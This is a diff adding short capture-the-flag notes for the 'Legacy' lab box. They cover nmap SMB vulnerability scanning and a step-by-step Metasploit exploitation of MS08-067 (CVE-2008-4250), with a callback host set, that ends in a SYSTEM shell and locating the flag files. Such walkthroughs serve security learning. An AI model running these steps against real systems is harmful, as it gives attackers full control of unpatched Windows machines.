@@ -1,0 +1,45 @@
+Legacy Box: Vulnerabilities - CVE - 2008 - 4250
+
+Enumeration:
+nmap -p- -sC -sV –min-rate=1000 10.129.227.181
+-Open ports 135, 139, 445
+
+nmap -p 445 --script smb-vuln* 10.129.227.181
+- The --script smb-vuln* option will run multiple nmap scripts that check for different vulnerabilities in the SMB protocol. 
+
+Initial foothold / attack:
+
+msfconsole
+
+search ms08-067
+	-This is found from the –script nmap scan, it is known as the microsoft ID
+
+use exploit/windows/smb/ms08_067_netapi 
+
+options 
+	-view options to set rhost, rport, lhost
+
+
+set lhost 10.10.14.251
+
+set rhost 10.129.227.181
+
+set rport 445
+
+run
+	-execute the exploit
+
+We are now in the compromised system logged in: NT AUTHORITY\SYSTEM
+
+Escalation
+
+shell 
+	-Opens interactive shell on compromised system
+
+net user
+	-lists user accounts in the system
+
+cd \Documents and Settings
+	-This is like a /Users pathway for modern OS’s. We can find the actual user’s file system here. 
+
+The flags are in Administrator’s desktop (root.txt) and john’s desktop (user.txt)
